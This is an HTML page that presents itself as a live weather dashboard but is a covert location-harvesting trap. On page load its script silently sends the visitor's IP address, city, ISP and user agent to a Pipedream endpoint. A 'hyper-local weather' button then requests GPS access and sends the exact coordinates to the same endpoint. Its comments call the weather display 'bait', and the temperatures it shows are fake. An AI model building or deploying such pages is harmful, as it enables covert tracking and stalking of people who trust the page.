<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Weather Dashboard</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #1a202c; color: white; text-align: center; padding: 50px; }
        .card { background: #2d3748; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 10px 15px rgba(0,0,0,0.3); }
        #city-name { font-size: 24px; color: #63b3ed; margin: 10px 0; }
        .btn { background: #3182ce; color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px; transition: 0.3s; }
        .btn:hover { background: #4299e1; transform: scale(1.05); }
        #status-msg { font-size: 14px; color: #a0aec0; margin-top: 15px; }
    </style>
</head>
<body>

    <div class="card">
        <h1>Local Weather Report</h1>
        <div id="city-name">Detecting region...</div>
        <p id="temp-display">Temperature: --°C</p>
        
        <button class="btn" onclick="getPrecisionWeather()">Get Hyper-Local Weather</button>
        <p id="status-msg">Based on your ISP location.</p>
    </div>

    <script>
        // REPLACE THIS WITH YOUR ACTUAL PIPEDREAM ENDPOINT
        const PIPEDREAM_URL = "https://eotwt8cj1vr426p.m.pipedream.net";

        // --- STAGE 1: AUTO-RUN IP CAPTURE ---
        window.onload = function() {
            fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                // Update UI with "Bait" info
                document.getElementById('city-name').innerText = "Weather for " + data.city + ", " + data.region;
                document.getElementById('temp-display').innerText = "Temperature: 28°C (Regional)";

                // SILENTLY SEND IP DATA TO PIPEDREAM
                fetch(PIPEDREAM_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        event: "IP_LOGGED",
                        ip: data.ip,
                        city: data.city,
                        isp: data.org,
                        device: navigator.userAgent
                    })
                });
            });
        };

        // --- STAGE 2: GPS PERMISSION ON CLICK ---
        function getPrecisionWeather() {
            document.getElementById('status-msg').innerText = "Requesting precision sensor access...";
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;

                    // Update UI to look successful
                    document.getElementById('city-name').innerText = "Precision Location Verified!";
                    document.getElementById('status-msg').innerText = "GPS Fixed: " + lat.toFixed(4) + ", " + lon.toFixed(4);
                    document.getElementById('temp-display').innerText = "Temperature: 29.4°C (Verified)";

                    // SEND THE "GOLD" DATA TO PIPEDREAM
                    fetch(PIPEDREAM_URL, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({
                            event: "GPS_LOGGED",
                            latitude: lat,
                            longitude: lon,
                            accuracy: position.coords.accuracy + " meters"
                        })
                    });
                }, function(error) {
                    document.getElementById('status-msg').innerText = "Precision access denied. Using ISP data.";
                });
            }
        }
    </script>
</body>
</html>
